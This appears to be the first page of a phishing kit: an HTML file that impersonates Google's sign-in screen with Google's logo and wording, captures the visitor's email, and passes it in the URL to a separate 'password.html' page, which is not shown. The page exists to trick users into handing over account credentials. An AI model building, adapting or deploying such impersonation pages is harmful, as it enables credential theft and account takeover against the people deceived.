
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in â€“ Google</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" class="logo" alt="Google">
    <form id="emailForm">
      <h2>Sign in</h2>
      <p>to continue to Google</p>
      <input type="email" id="email" name="email" placeholder="Email or phone" required>
      <button type="submit">Next</button>
    </form>
  </div>
  <script>
    document.getElementById('emailForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      window.location.href = "password.html?email=" + encodeURIComponent(email);
    });
  </script>
</body>
</html>
